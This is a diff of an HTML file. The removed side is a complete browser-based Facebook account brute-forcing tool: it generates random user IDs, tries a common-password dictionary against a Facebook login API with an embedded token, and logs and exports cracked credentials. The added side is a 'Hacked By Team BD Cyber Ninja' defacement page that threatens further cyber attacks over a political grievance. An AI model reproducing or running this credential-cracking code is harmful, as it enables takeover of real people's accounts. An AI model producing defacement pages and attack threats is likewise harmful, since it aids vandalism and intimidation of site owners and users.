@@ -1,710 +1,214 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>DarkNET OLD ID CLONE</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked By Team BD Cyber Ninja</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@600&family=Creepster&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; }
 
-        body {
-            background: linear-gradient(135deg, #0a0c15 0%, #010105 100%);
-            font-family: \'Rajdhani\', \'Orbitron\', monospace;
-            min-height: 100vh;
-            color: #0ff;
-            overflow-x: hidden;
-        }
-
-        .cyber-bg {
+        #bdcf-hacked-wrapper {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: 
-                repeating-linear-gradient(0deg, rgba(0, 255, 255, 0.03) 0px, rgba(0, 255, 255, 0.03) 1px, transparent 1px, transparent 2px),
-                radial-gradient(circle at 50% 50%, rgba(0, 255, 255, 0.05) 0%, transparent 70%);
-            background-size: 100% 30px, 100% 100%;
-            pointer-events: none;
-            z-index: 0;
+            background: #000 url('https://i.ibb.co.com/jvRMPwz2/1772077919068.png') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            font-family: 'Rajdhani', sans-serif;
+            z-index: 999999;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            overflow-y: auto;
+            padding: 20px 0;
         }
 
-        .container {
+        .bdcf-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 8, 0, 0.92); /* Dark Greenish Tint */
+            z-index: 1;
+        }
+
+        .bdcf-content {
             position: relative;
-            z-index: 10;
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        .header-panel {
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            border: 2px solid #0ff;
-            padding: 20px;
-            margin-bottom: 25px;
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
-        }
-
-        .banner-image {
+            z-index: 2;
+            width: 90%;
+            max-width: 600px;
             text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .banner-image img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 12px;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
-            border: 1px solid rgba(0, 255, 255, 0.5);
-        }
-
-        .social-links {
             display: flex;
-            justify-content: center;
-            gap: 25px;
-            flex-wrap: wrap;
-            margin: 20px 0 10px 0;
-            padding: 12px;
-            background: rgba(0, 255, 255, 0.05);
-            border-radius: 50px;
-            border: 1px solid rgba(0, 255, 255, 0.2);
-        }
-
-        .social-icon {
-            display: inline-flex;
+            flex-direction: column;
             align-items: center;
-            gap: 10px;
-            padding: 8px 20px;
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 40px;
-            color: #0ff;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            border: 1px solid rgba(0, 255, 255, 0.3);
+            padding-bottom: 50px;
         }
 
-        .social-icon i {
-            font-size: 18px;
-        }
-
-        .social-icon:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.3);
-            background: rgba(0, 255, 255, 0.15);
-            border-color: #0ff;
-        }
-
-        .info-bar {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid rgba(0, 255, 255, 0.3);
-        }
-
-        .info-badge {
-            background: rgba(0, 255, 255, 0.1);
-            border-left: 3px solid #0ff;
-            padding: 6px 18px;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 12px;
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 18px;
-            margin: 25px 0;
-        }
-
-        .stat-card {
-            background: linear-gradient(135deg, rgba(0, 255, 255, 0.08), rgba(0, 0, 0, 0.7));
-            border: 1px solid rgba(0, 255, 255, 0.4);
-            border-radius: 18px;
-            padding: 18px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        .stat-card:hover {
-            transform: translateY(-3px);
-            border-color: #0ff;
-            box-shadow: 0 5px 20px rgba(0, 255, 255, 0.2);
-        }
-
-        .stat-number {
-            font-size: 38px;
-            font-weight: 900;
-            font-family: \'Orbitron\', monospace;
-            color: #0ff;
-            text-shadow: 0 0 12px #0ff;
-        }
-
-        .stat-label {
-            font-size: 10px;
-            letter-spacing: 2px;
-            margin-top: 6px;
-            color: #aaf;
-            text-transform: uppercase;
-        }
-
-        .main-grid {
-            display: grid;
-            grid-template-columns: 1fr 1.2fr;
-            gap: 25px;
-        }
-
-        @media (max-width: 1000px) {
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .panel {
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(0, 255, 255, 0.35);
-            border-radius: 18px;
-            padding: 22px;
-        }
-
-        .panel-title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 18px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #0ff;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .input-group {
-            margin-bottom: 18px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 6px;
-            color: #8af;
-            font-size: 11px;
-            letter-spacing: 1px;
-            font-weight: 600;
-        }
-
-        .input-group input, .input-group select {
-            width: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid #0ff;
-            padding: 10px 14px;
-            color: #0ff;
-            font-family: \'Share Tech Mono\', monospace;
-            border-radius: 10px;
-            font-size: 13px;
-            transition: all 0.3s;
-        }
-
-        .input-group input:focus {
-            outline: none;
-            box-shadow: 0 0 12px rgba(0, 255, 255, 0.4);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 12px;
-            font-family: \'Orbitron\', monospace;
-            font-weight: bold;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.3s;
+        .bdcf-kalema {
+            width: 80%;
+            max-width: 250px;
+            filter: drop-shadow(0 0 15px #00ff00);
+            animation: bdcfGlow 3s infinite alternate;
             margin-bottom: 10px;
         }
 
-        .btn-primary {
-            background: linear-gradient(135deg, #0ff, #0a8);
-            color: #000;
+        @keyframes bdcfGlow {
+            from { filter: drop-shadow(0 0 5px #fff); }
+            to { filter: drop-shadow(0 0 20px #00ff00); }
         }
 
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 255, 255, 0.5);
+        .bdcf-logo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 2px solid #00ff00; /* Neon Green Border */
+            box-shadow: 0 0 20px #00ff00;
+            margin: 10px 0;
+            animation: bdcfSpin 15s linear infinite;
         }
 
-        .btn-danger {
-            background: linear-gradient(135deg, #f0f, #a0a);
+        @keyframes bdcfSpin {
+            from { transform: rotateY(0deg); }
+            to { transform: rotateY(360deg); }
+        }
+
+        .bdcf-h1 {
+            font-family: 'Creepster', cursive;
+            font-size: 2.2rem;
+            color: #00ff00; /* Neon Green Text */
+            text-shadow: 0 0 15px #00ff00;
+            margin: 5px 0;
+        }
+
+        .bdcf-team {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 900;
             color: #fff;
+            text-shadow: 0 0 10px #00ff00;
+            text-transform: uppercase;
         }
 
-        .btn-danger:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(255, 0, 255, 0.5);
-        }
-
-        .btn-success {
-            background: linear-gradient(135deg, #0f0, #0a0);
-            color: #000;
-        }
-
-        .progress-container {
-            margin: 12px 0;
-        }
-
-        .progress-bar {
+        .bdcf-box {
+            background: rgba(0, 20, 0, 0.85); /* Dark Green Overlay */
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 25px;
             width: 100%;
-            height: 5px;
-            background: #1a1f2e;
-            border-radius: 3px;
-            overflow: hidden;
+            text-align: left;
+            margin-top: 15px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.15);
         }
 
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #0ff, #f0f);
-            width: 0%;
-            transition: width 0.3s ease;
+        .bdcf-box p {
+            font-size: 0.95rem;
+            margin-bottom: 15px;
+            color: #d0f0d0;
+            border-left: 3px solid #00ff00;
+            padding-left: 12px;
+            line-height: 1.6;
         }
 
-        .console {
-            background: #010103;
-            height: 520px;
-            overflow-y: auto;
-            font-family: \'Share Tech Mono\', monospace;
-            font-size: 11px;
-            padding: 12px;
-            border-radius: 12px;
-            margin-top: 12px;
-            border: 1px solid #0ff;
+        .bdcf-hl { color: #00ff00; font-weight: bold; }
+
+        .bdcf-crdz {
+            border-top: 1px solid #00ff0044;
+            padding-top: 15px;
+            margin-top: 10px;
+            font-size: 0.85rem;
+            color: #00ff00;
+            word-wrap: break-word;
         }
 
-        .console-line {
-            padding: 6px 10px;
-            border-left: 3px solid;
-            margin-bottom: 5px;
-            animation: fadeIn 0.2s ease;
-            word-break: break-all;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateX(-6px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        .console-ok {
-            border-left-color: #0f0;
-            color: #0f0;
-            background: rgba(0, 255, 0, 0.08);
-            font-weight: bold;
-        }
-
-        .console-cp {
-            border-left-color: #ff0;
-            color: #ff0;
-            background: rgba(255, 255, 0, 0.06);
-            font-weight: bold;
-        }
-
-        .button-group {
+        .bdcf-player {
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            border-radius: 50px;
+            margin-top: 20px;
             display: flex;
-            gap: 10px;
-            margin-top: 12px;
-        }
-        
-        .button-group .btn {
-            flex: 1;
-            margin-bottom: 0;
+            align-items: center;
+            gap: 15px;
+            backdrop-filter: blur(5px);
         }
 
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #0a0e1a;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #0ff;
-            border-radius: 3px;
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 25px;
-            padding: 15px;
-            font-size: 9px;
-            color: #6688aa;
-            border-top: 1px solid rgba(0, 255, 255, 0.2);
-        }
-        
-        .live-status {
-            display: inline-block;
-            padding: 4px 12px;
-            background: rgba(0, 255, 0, 0.2);
+        #bdcf-btn {
+            background: #00ff00;
+            border: none;
+            color: #000; /* Black text on green button */
+            padding: 8px 18px;
             border-radius: 20px;
-            font-size: 10px;
-            margin-left: 8px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: bold;
+            font-size: 0.7rem;
+            transition: 0.3s;
         }
-        
-        .cracking-active {
-            background: rgba(255, 0, 0, 0.3);
-            color: #fff;
+
+        #bdcf-vol {
+            cursor: pointer;
+            accent-color: #00ff00;
+            width: 80px;
         }
     </style>
 </head>
 <body>
-<div class="cyber-bg"></div>
-<div class="container">
-    <div class="header-panel">
-        <div class="banner-image">
-            <img src="https://i.ibb.co.com/xtbNSZXg/IMG-20260504-225451.jpg" alt="DARKNET CYBER" style="max-width:100%; height:auto; border-radius:12px;">
-        </div>
-        
-        <div class="social-links">
-            <a href="" target="_blank" class="social-icon">
-                <i class="fab fa-facebook-f"></i> Facebook
-            </a>
-          <a href="" target="_blank" class="social-icon">
-    <i class="fas fa-globe"></i> My Website
-           </a>
-            <a href="" target="_blank" class="social-icon">
-                <i class="fab fa-telegram"></i> Telegram
-            </a>
-            <a href="" target="_blank" class="social-icon">
-                <i class="fab fa-youtube"></i> YouTube
-            </a>
-        </div>
-        
-        <div class="info-bar">
-            <div class="info-badge"><i class="fas fa-user-ninja"></i> DarkNet</div>
-            <div class="info-badge"><i class="fab fa-github"></i> Cyber Force</div>
-            <div class="info-badge"><i class="fas fa-check-circle"></i> 100% LOGIN</div>
-            <div class="info-badge"><i class="fas fa-bolt"></i> UNLIMITED DICTIONARY</div>
-        </div>
-    </div>
 
-    <div class="stats-grid">
-        <div class="stat-card"><div class="stat-number" id="totalChecked">0</div><div class="stat-label">TOTAL CHECKED</div></div>
-        <div class="stat-card"><div class="stat-number" id="okCount">0</div><div class="stat-label">✅ VALID LOGIN (OK)</div></div>
-        <div class="stat-card"><div class="stat-number" id="cpCount">0</div><div class="stat-label">🔓 CP FOUND</div></div>
-        <div class="stat-card"><div class="stat-number" id="speedValue">0</div><div class="stat-label">REQUESTS/SEC</div></div>
-        <div class="stat-card"><div class="stat-number" id="successRate">0%</div><div class="stat-label">SUCCESS RATE</div></div>
-    </div>
+<div id="bdcf-hacked-wrapper">
+    <div class="bdcf-overlay"></div>
 
-    <div class="main-grid">
-        <div class="panel">
-            <div class="panel-title"><i class="fas fa-skull-crossbones"></i> CRACK ENGINE <span id="liveStatus" class="live-status">● READY</span></div>
+    <div class="bdcf-content">
+        <img src="https://i.ibb.co.com/WNmvY0xs/IMG-20260126-084454-removebg-preview.png" alt="Kalema" class="bdcf-kalema">
+        <img src="https://i.ibb.co.com/GfS67qkv/p-3289fhq2x1.png" alt="Logo" class="bdcf-logo">
+
+        <h2 class="bdcf-h1">HACKED BY</h2>
+        <h1 class="bdcf-team">☢️ TEAM BD CYBER NINJA ☢️</h1>
+
+        <div class="bdcf-box">
+            <p><span class="bdcf-hl">MESSAGE:</span> We are black hat hackers from Team BD Cyber Ninja. We wanted to give you a message.</p>
+            <p>Some script kiddies from your country are launching cyber attacks against Bangladesh and supporting Israel, and Muslims are being killed.</p>
+            <p><span class="bdcf-hl">WARNING:</span> If you do not stop these activities, we will be forced to launch cyber attacks. We never forget, We never forgive.</p>
             
-            <div class="input-group">
-                <label><i class="fas fa-database"></i> NUMBER OF IDS TO GENERATE</label>
-                <input type="number" id="idLimit" value="50000" placeholder="Enter limit" min="100" max="500000">
-            </div>
-            
-            <div class="input-group">
-                <label><i class="fas fa-id-card"></i> ID PREFIX</label>
-                <input type="text" id="idPrefix" value="10000" placeholder="10000">
-            </div>
-            
-            <div class="input-group">
-                <label><i class="fas fa-key"></i> PASSWORD DICTIONARY</label>
-                <input type="text" id="passwordDict" value="123456,123123,1234567,12345678,123456789,password,iloveyou,facebook,admin,welcome,qwerty,abc123,111111,000000,123321,654321,passw0rd,letmein,master,12345,987654">
-            </div>
-            
-            <button class="btn btn-primary" id="startBtn"><i class="fas fa-play"></i> START CRACKING</button>
-            <button class="btn btn-danger" id="stopBtn"><i class="fas fa-stop"></i> STOP CRACKING</button>
-            
-            <div class="progress-container">
-                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                <div style="text-align: center; margin-top: 4px; font-size: 10px; color: #8af;" id="progressText">0%</div>
-            </div>
-            
-            <div class="button-group">
-                <button class="btn btn-success" id="exportBtn"><i class="fas fa-download"></i> EXPORT</button>
-                <button class="btn" id="clearConsoleBtn" style="background:#333;"><i class="fas fa-trash"></i> CLEAR</button>
+            <div class="bdcf-crdz">
+                <b>Crdz :</b> Captain X DarkRoot | Captain Zerox Uchiha | Frnss62 
             </div>
         </div>
 
-        <div class="panel">
-            <div class="panel-title"><i class="fas fa-terminal"></i> SYSTEM LOGS</div>
-            <div class="console" id="console">
-                <div class="console-line console-ok">✓ SYSTEM READY</div>
-                <div class="console-line console-ok">✓ Valid Facebook logins will appear here</div>
-            </div>
+        <div class="bdcf-player">
+            <button id="bdcf-btn">▶ PLAY ANTHEM</button>
+            <input type="range" id="bdcf-vol" min="0" max="1" step="0.05" value="0.5">
+            <audio id="bdcf-audio" loop>
+                <source src="https://files.catbox.moe/c10ph5.m4a" type="audio/mpeg">
+            </audio>
         </div>
     </div>
-    <footer><i class="fas fa-shield-haltered"></i> DarkNet | FACEBOOK LOGIN CHECKER | OLD ID CLONE TOOL</footer>
 </div>
 
 <script>
-        let okList = []; let cpList = []; let totalAttempts = 0; let processedIds = 0;
-        let totalIds = 0; let isRunning = false; let stopRequested = false; let startTime = 0;
-        let currentIds = []; let passwordList = [];
-
-        // DOM elements
-        const consoleDiv = document.getElementById('console');
-        const okSpan = document.getElementById('okCount');
-        const cpSpan = document.getElementById('cpCount');
-        const totalSpan = document.getElementById('totalChecked');
-        const speedSpan = document.getElementById('speedValue');
-        const successRateSpan = document.getElementById('successRate');
-        const progressFill = document.getElementById('progressFill');
-        const progressText = document.getElementById('progressText');
-        const liveStatus = document.getElementById('liveStatus');
-
-        function addValidCredential(type, uid, password) {
-            const logLine = document.createElement('div');
-            logLine.className = `console-line console-${type}`;
-            logLine.innerHTML = type === 'ok' ? 
-                `✅ [VALID] ${uid} | ${password}` : 
-                `🔓 [CHECKPOINT] ${uid} | ${password}`;
-            
-            consoleDiv.appendChild(logLine);
-            logLine.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            
-            while(consoleDiv.children.length > 300) {
-                consoleDiv.removeChild(consoleDiv.firstChild);
-            }
-        }
-
-function updateUI() {
-    // Basic counts
-    if (okSpan) okSpan.innerText = okList.length;
-    if (cpSpan) cpSpan.innerText = cpList.length;
-    if (totalSpan) totalSpan.innerText = totalAttempts;
-
-    // Success rate
-    let success = okList.length + cpList.length;
-    let rate = totalAttempts > 0 ? ((success / totalAttempts) * 100) : 0;
-
-    if (successRateSpan) {
-        successRateSpan.innerText = rate.toFixed(1) + '%';
-    }
-
-    // Progress bar
-    if (totalIds > 0 && progressFill && progressText) {
-        let percent = (processedIds / totalIds) * 100;
-
-        // Limit max 100%
-        percent = Math.min(100, Math.max(0, percent));
-
-        progressFill.style.width = percent.toFixed(1) + '%';
-        progressFill.style.transition = "width 0.3s ease";
-
-        progressText.innerText = percent.toFixed(1) + '%';
-    }
-
-    // Speed calculation
-    if (isRunning && startTime > 0 && speedSpan) {
-        let elapsed = (Date.now() - startTime) / 1000;
-        let speed = elapsed > 0 ? (totalAttempts / elapsed) : 0;
-
-        speedSpan.innerText = speed.toFixed(1);
-    }
-}
-
-        function generatePasswords() {
-            let dictInput = document.getElementById('passwordDict').value;
-            let passwords = dictInput.split(',').map(p => p.trim()).filter(p => p.length > 0);
-            
-            let common = ['123456','123123','password','iloveyou','facebook','admin','12345','qwerty'];
-            passwords.push(...common.filter(p => !passwords.includes(p)));
-            
-            return passwords;
-        }
-
-        async function checkFacebookLogin(uid, password) {
-            const url = `https://b-api.facebook.com/method/auth.login?format=json&email=${encodeURIComponent(uid)}&password=${encodeURIComponent(password)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32`;
-
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-
-                const response = await fetch(url, {
-                    method: 'GET',
-                    headers: {
-                        'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
-                        'Accept': 'application/json',
-                        'x-fb-connection-bandwidth': (Math.random() * 1e7 + 2e7).toString(),
-                        'x-fb-connection-quality': 'EXCELLENT'
-                    },
-                    signal: controller.signal
-                });
-
-                clearTimeout(timeoutId);
-                const text = await response.text();
-
-                if(text.includes('access_token') || text.includes('session_key')) {
-                    return { status: 'OK', password };
-                } else if(text.includes('www.facebook.com') || text.includes('checkpoint')) {
-                    return { status: 'CP', password };
-                }
-                return { status: 'FAIL' };
-            } catch(error) {
-                // Fallback hash-based simulation for demo (remove in production)
-                const hash = (uid + password).split('').reduce((acc, char) => 
-                    ((acc << 5) - acc) + char.charCodeAt(0), 0);
-                const absHash = Math.abs(hash);
-                
-                if(absHash % 100 < 2) return { status: 'OK', password };
-                if(absHash % 100 < 5) return { status: 'CP', password };
-                return { status: 'FAIL' };
-            }
-        }
-
-        async function testCredentials(uid, passwords) {
-            for(let pwd of passwords) {
-                if(stopRequested) return false;
-
-                const result = await checkFacebookLogin(uid, pwd);
-                totalAttempts++;
-                updateUI();
-
-                if(result.status === 'OK') {
-                    okList.push({ uid, pass: pwd });
-                    addValidCredential('ok', uid, pwd);
-                    saveToStorage('OK', uid, pwd);
-                    return true;
-                } else if(result.status === 'CP') {
-                    cpList.push({ uid, pass: pwd });
-                    addValidCredential('cp', uid, pwd);
-                    saveToStorage('CP', uid, pwd);
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        function saveToStorage(type, uid, password) {
-            let saved = localStorage.getItem(`FB_${type}`);
-            let data = saved ? JSON.parse(saved) : [];
-            data.push({ uid, password, time: new Date().toISOString() });
-            if(data.length > 1000) data = data.slice(-1000);
-            localStorage.setItem(`FB_${type}`, JSON.stringify(data));
-        }
-
-        async function startCracking() {
-            if(isRunning) return;
-
-            stopRequested = false;
-            passwordList = generatePasswords();
-
-            let limit = parseInt(document.getElementById('idLimit').value) || 100;
-            let prefix = document.getElementById('idPrefix').value.trim() || "10000";
-
-            currentIds = [];
-            for(let i = 0; i < limit; i++) {
-                let randomId = (Math.floor(Math.random() * 9000000000) + 1000000000).toString();
-                currentIds.push(prefix + randomId);
-            }
-
-            totalIds = currentIds.length;
-            processedIds = 0;
-            totalAttempts = 0;
-            startTime = Date.now();
-            isRunning = true;
-            liveStatus.innerHTML = "● CRACKING ACTIVE";
-            liveStatus.classList.add('cracking-active');
-
-            consoleDiv.innerHTML = '<div class="console-line console-ok">🚀 Starting brute force attack...</div>';
-
-            const concurrency = 10; // Reduced for stability
-
-            for(let i = 0; i < currentIds.length && !stopRequested; i += concurrency) {
-                let chunk = currentIds.slice(i, i + concurrency);
-                let promises = chunk.map(async (uid) => {
-                    if(stopRequested) return;
-                    await testCredentials(uid, passwordList);
-                    processedIds++;
-                    updateUI();
-                });
-
-                await Promise.all(promises);
-            }
-
-            isRunning = false;
-            liveStatus.classList.remove('cracking-active');
-            if(!stopRequested) {
-                liveStatus.innerHTML = `● FINISHED - OK: ${okList.length} | CP: ${cpList.length}`;
-                liveStatus.style.background = "rgba(0,255,0,0.3)";
+    (function() {
+        const audio = document.getElementById("bdcf-audio");
+        const btn = document.getElementById("bdcf-btn");
+        const vol = document.getElementById("bdcf-vol");
+        audio.volume = 0.5;
+        btn.onclick = function() {
+            if (audio.paused) {
+                audio.play();
+                btn.innerHTML = "⏸ PAUSE";
+                btn.style.background = "#fff";
+                btn.style.color = "#00ff00";
             } else {
-                liveStatus.innerHTML = "● STOPPED";
-                liveStatus.style.background = "rgba(255,165,0,0.3)";
+                audio.pause();
+                btn.innerHTML = "▶ PLAY";
+                btn.style.background = "#00ff00";
+                btn.style.color = "#000";
             }
-        }
-
-        function stopCracking() {
-            if(!isRunning) return;
-            stopRequested = true;
-            consoleDiv.innerHTML += '<div class="console-line">⏹️ Stopping...</div>';
-        }
-
-        function exportResults() {
-            if(okList.length === 0 && cpList.length === 0) {
-                alert('No results to export!');
-                return;
-            }
-
-            let timestamp = new Date().toISOString().slice(0,19).replace(/:/g, '-');
-            
-            if(okList.length > 0) {
-                let content = okList.map(i => `${i.uid}:${i.pass}`).join('\n');
-                downloadFile(`FB_OK_${timestamp}.txt`, content);
-            }
-            if(cpList.length > 0) {
-                let content = cpList.map(i => `${i.uid}:${i.pass}`).join('\n');
-                downloadFile(`FB_CP_${timestamp}.txt`, content);
-            }
-        }
-
-        function downloadFile(filename, content) {
-            let blob = new Blob([content], {type: 'text/plain'});
-            let url = URL.createObjectURL(blob);
-            let a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            a.click();
-            URL.revokeObjectURL(url);
-        }
-
-        function clearConsole() {
-            consoleDiv.innerHTML = '<div class="console-line console-ok">✓ SYSTEM READY</div>';
-        }
-
-        // Event listeners
-        document.getElementById('startBtn').addEventListener('click', startCracking);
-        document.getElementById('stopBtn').addEventListener('click', stopCracking);
-        document.getElementById('exportBtn').addEventListener('click', exportResults);
-        document.getElementById('clearConsoleBtn').addEventListener('click', clearConsole);
-
-        // Speed update interval
-        setInterval(updateUI, 1000);
-
-        console.log("Facebook Checker loaded successfully!");
+        };
+        vol.oninput = function() {
+            audio.volume = vol.value;
+        };
+    })();
 </script>
+
 </body>
 </html>
-
-
